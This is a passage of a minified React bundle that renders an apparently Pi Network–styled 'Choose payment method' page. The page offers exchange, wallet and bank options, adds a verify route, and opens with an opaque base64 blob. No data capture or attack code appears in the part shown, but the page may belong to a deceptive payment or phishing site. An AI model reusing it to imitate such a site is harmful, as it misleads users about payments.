Pd5FLZZua+YAum7qsuDjKU4LoiV5sIgP7sD/ceaJ9/T+YcLdtz2Pl72EEk79rFuI6ZEfA3HW0MaZKx83gnSpew97nl4Z82aN1e0Kk67ZdvcV0yVvOA+CggFVxsHoaER97ivmIZxCNVvpqWADOKdskEPopIoLMVU1HPs1zDIGk7b6kkJIkuwi+ioyyzQaMdCMBEYRNLkktLRvRe3VY9iIfIHEOsv8TfR0Z3XdcWdQLqU7iDGPYx8gY480k0sou2I2QElpWNl+wC3g2QUghjLsfhmBlFd5H+j473VEN3CbjJSupR80SSkI+tJbdc7WFK6lHTZJqWj/rPbJpgz1d4FxMZLzPf7hI4OXtZWqlmIHBfEeLsRSla+PTwlyFli7+FARfbfiU8UMZNmphnmmVc63u8erl65hkLCf7qV23QgiiS9kI72GWUYPYUjQL5dLSlB6GajSEzH6HSsRrUWutvkP6H6recWynoQ4ZeIV3sppmRuCpA/88xnzYyBmHesD37YFDNGtFvuuRyIIffzQOvHlOzMJzgPgTjS3+PovMzBz+t4wzkBokxW97gvc5B+HURhUYvEzEGYJ5lAxFl9LuMLg/hbtSwHsTSU9mUO7YUciBmoKVS/xhy+MGY9AeLZwz8nP88c/D0O11sSICqLwtt03YZBKlMmB4gSqmCUypzRAiJlcEuZpLKKKEBs6JPtmMMbeOZ3XxCLrfk+DFI59mn0lRDqi3SCb+/fmYP/+8FaaxJm77Sf15kVc3Am7/ETAaJSASJ75iDKFmwgMke7iEkqqykAEX6hzsYcbvreekUCYtWQ2o9BJlWmHDpPCaGRSqa3Lf2Zw36rbSkOgrFCYdpNrY5jDp7wJkoIgKhZYCGTVKYLLhC6wcIklZaVCgYi1up/DnOw8vG9MlIIxBYxfELmcK9Jvj0nBjkmfE6s25lBKleJKQ5C/SIN024NYA4+vmebL1EQRkXGKJVpNheIgtEgZJJJpDJFASJF8EiZw8m8TTdPAhE5+TzDNXP4+/jfvnoqA7Ggq7oUc+iz6JqHOZdhmHZbs+UZZAl2sznOgcRyu0oGufDMC0T+tt2VcXN0/x2NV2IA",
    Eg = "/assets/bank1-dc6f47fb.jpg",
    Cg = "/assets/gpay-8ec1357d.png",
    Ng = "/assets/skrill-92d18c4c.png",
    Pg = "/assets/cashapp-794ecf30.png",
    jg = "/assets/revolut-c538d9e4.png",
    Ag = "/assets/trustwallet-4ca01eec.png";

function Ig() {
    return d.jsx("div", {
        children: d.jsx("div", {
            id: "root",
            children: d.jsx("div", {
                className: "App",
                children: d.jsxs("div", {
                    className: "piscreen",
                    children: [d.jsxs("div", {
                        className: "pi_sign",
                        children: [d.jsx("img", {
                            src: Op,
                            alt: ""
                        }), d.jsx("h3", {
                            children: "Choose payment method "
                        })]
                    }), d.jsx("div", {
                        className: "pilinks",
                        children: d.jsxs("ul", {
                            children: [d.jsx("li", {
                                children: d.jsxs("a", {
                                    href: "/home",
                                    className: "pilinkcard",
                                    children: [d.jsx("div", {
                                        className: "imgs",
                                        style: {
                                            backgroundImage: `url("${kg}")`
                                        }
                                    }), d.jsx("p", {
                                        children: "Binance"
                                    })]
                                })
                            }), d.jsx("li", {
                                children: d.jsxs("a", {
                                    href: "/home",
                                    className: "pilinkcard",
                                    children: [d.jsx("div", {
                                        className: "imgs",
                                        style: {
                                            backgroundImage: `url("${xg}")`
                                        }
                                    }), d.jsx("p", {
                                        children: "Bybit"
                                    })]
                                })
                            }), d.jsx("li", {
                                children: d.jsxs("a", {
                                    href: "/home",
                                    className: "pilinkcard",
                                    children: [d.jsx("div", {
                                        className: "imgs",
                                        style: {
                                            backgroundImage: `url("${Sg}")`
                                        }
                                    }), d.jsx("p", {
                                        children: "Paypal"
                                    })]
                                })
                            }), d.jsx("li", {
                                children: d.jsxs("a", {
                                    href: "/home",
                                    className: "pilinkcard",
                                    children: [d.jsx("div", {
                                        className: "imgs",
                                        style: {
                                            backgroundImage: `url("${Eg}")`
                                        }
                                    }), d.jsx("p", {
                                        children: "Bank"
                                    })]
                                })
                            }), d.jsx("li", {
                                children: d.jsxs("a", {
                                    href: "/home",
                                    className: "pilinkcard",
                                    children: [d.jsx("div", {
                                        className: "imgs",
                                        style: {
                                            backgroundImage: `url("${Cg}")`
                                        }
                                    }), d.jsx("p", {
                                        children: "Gpay"
                                    })]
                                })
                            }), d.jsx("li", {
                                children: d.jsxs("a", {
                                    href: "/home",
                                    className: "pilinkcard",
                                    children: [d.jsx("div", {
                                        className: "imgs",
                                        style: {
                                            backgroundImage: `url("${Ng}")`
                                        }
                                    }), d.jsx("p", {
                                        children: "Skrill"
                                    })]
                                })
                            }), d.jsx("li", {
                                children: d.jsxs("a", {
                                    href: "/home",
                                    className: "pilinkcard",
                                    children: [d.jsx("div", {
                                        className: "imgs",
                                        style: {
                                            backgroundImage: `url("${Pg}")`
                                        }
                                    }), d.jsx("p", {
                                        children: "Cashapp"
                                    })]
                                })
                            }), d.jsx("li", {
                                children: d.jsxs("a", {
                                    href: "/home",
                                    className: "pilinkcard",
                                    children: [d.jsx("div", {
                                        className: "imgs",
                                        style: {
                                            backgroundImage: `url("${jg}")`
                                        }
                                    }), d.jsx("p", {
                                        children: "Revolut"
                                    })]
                                })
                            }), d.jsx("li", {
                                children: d.jsxs("a", {
                                    href: "/home",
                                    className: "pilinkcard",
                                    children: [d.jsx("div", {
                                        className: "imgs",
                                        style: {
                                            backgroundImage: `url("${Ag}")`
                                        }
                                    }), d.jsx("p", {
                                        children: "Trustwallet"
                                    })]
                                })
                            })]
                        })
                    }), d.jsxs("button", {
                        className: "explorebtn",
                        children: [d.jsx(le, {
                            icon: Ts.faCircleNotch
                        }), "Explore the Testnet Ecosystem"]
                    })]
                })
            })
        })
    })
}
const Og = () => [{
    path: "/",
    element: d.jsx(rg, {}),
    id: 1
}, {
    path: "/home",
    element: d.jsx(pg, {}),
    id: 2
}, {
    path: "/verify",
    element: d.jsx(wg, {}),
    id: 3
}, {
    path: "/payment",
    element: d.jsx(Ig, {}),
    id: 4
}];

function bg() {
    const e = Og();
    return d.jsx(d.Fragment, {
        children: d.jsx(Q1, {
            children: d.jsx(V1, {
                children: e.map(t => d.jsx(Gd, {
                    path: t.path,
                    element: t.element
                }, t.id))
            })
        })
    })
}
fl.createRoot(document.getElementById("root")).render(d.jsx(sa.StrictMode, {
    children: d.jsx(bg, {})
}));